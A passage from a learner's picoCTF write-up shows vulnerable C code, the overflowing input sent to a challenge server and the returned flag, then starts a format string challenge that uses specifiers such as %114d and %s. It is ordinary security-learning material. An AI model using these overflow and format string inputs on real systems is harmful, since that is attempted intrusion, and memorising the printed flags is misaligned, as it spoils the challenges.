## Solution
On reading the source code and getting hints from the name of the challenge, I found that there was a user defined sigsegv_handler(int sig) function that would print the flag if a segmentation fault occured. 

```C
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
The vuln function gave me the clue that the way to cause this error would be by inputting value above the limit 16. On doing so, I was able to obtain the flag.

```bash
pri279-picoctf@webshell:~$ nc saturn.picoctf.net 53744
Input: qqqqqqqqqqqqqqqqqqqqqqqq
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts Learnt:
I got an idea about signal handlers and how to cause buffer overflow to obtain desired output.

# 2. format string 0

Connect with the challenge instance here:
nc mimas.picoctf.net 62847

## Solution
On launching the instance, I was able to access a menu driven program that asked me to choose a burger for a customer. It was mentioned that the customer, Patrick, wanted a giant bite. This meant that the option having format specifier %114d which meant an integer of size 114 would be resulted. This was the correct pick. For the second customer, SpongeBob wanted to "break the shop". Hence I picked the Cla%sic_Che%s%steak and it turned out to be the right option. 

```bash
pri279-picoctf@webshell:~$ nc mimas.picoctf.net 57603
